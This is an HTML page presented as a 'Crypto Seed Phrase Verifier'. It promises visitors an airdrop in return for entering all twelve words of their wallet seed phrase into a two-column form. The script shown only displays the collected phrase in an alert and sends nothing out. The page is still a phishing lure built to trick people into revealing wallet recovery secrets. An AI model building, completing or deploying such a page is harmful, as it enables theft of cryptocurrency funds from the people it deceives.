<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Seed Phrase Verifier</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 20px;
            background-color: #f9fafb;
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: auto;
            display: grid;
            grid-template-columns: 1fr 1fr; /* Two-column layout */
            gap: 20px; /* Space between columns */
        }
        .column {
            display: flex;
            flex-direction: column;
            gap: 15px; /* Space between input fields */
        }
        label {
            font-size: 14px;
            font-weight: bold;
            color: #555;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        input[type="text"]:focus {
            border-color: #007BFF;
            outline: none;
        }
        button {
            padding: 12px 24px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            width: fit-content;
            margin: 20px auto 0 auto; /* Center the button */
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #0056b3;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            color: #2d3748;
        }
    </style>
</head>
<body>

<div class="header">
    <h1>Enter Your 12 Crypto Seed Phrases to earn an Airdrop</h1>
    <p>Please fill in all 12 seed words below.</p>
</div>

<div class="container">
    <!-- Left Column -->
    <div class="column">
        <label for="word1">Word 1</label>
        <input type="text" id="word1" placeholder="Enter Word 1">
        <label for="word2">Word 2</label>
        <input type="text" id="word2" placeholder="Enter Word 2">
        <label for="word3">Word 3</label>
        <input type="text" id="word3" placeholder="Enter Word 3">
        <label for="word4">Word 4</label>
        <input type="text" id="word4" placeholder="Enter Word 4">
        <label for="word5">Word 5</label>
        <input type="text" id="word5" placeholder="Enter Word 5">
        <label for="word6">Word 6</label>
        <input type="text" id="word6" placeholder="Enter Word 6">
    </div>

    <!-- Right Column -->
    <div class="column">
        <label for="word7">Word 7</label>
        <input type="text" id="word7" placeholder="Enter Word 7">
        <label for="word8">Word 8</label>
        <input type="text" id="word8" placeholder="Enter Word 8">
        <label for="word9">Word 9</label>
        <input type="text" id="word9" placeholder="Enter Word 9">
        <label for="word10">Word 10</label>
        <input type="text" id="word10" placeholder="Enter Word 10">
        <label for="word11">Word 11</label>
        <input type="text" id="word11" placeholder="Enter Word 11">
        <label for="word12">Word 12</label>
        <input type="text" id="word12" placeholder="Enter Word 12">
    </div>
</div>

<!-- Verify Button -->
<button onclick="verifySeedPhrase()">Verify</button>

<script>
    function verifySeedPhrase() {
        // Collect all the seed words from the input fields
        const seedWords = [];
        for (let i = 1; i <= 12; i++) {
            const word = document.getElementById(`word${i}`).value.trim();
            if (word === "") {
                alert("Please fill in all 12 seed words.");
                return;
            }
            seedWords.push(word);
        }

        // Join the seed words into a single string separated by spaces
        const seedPhrase = seedWords.join(" ");

        // Display the seed phrase in an alert box
        alert(`Your seed phrase is: ${seedPhrase}`);
    }
</script>

</body>
</html>
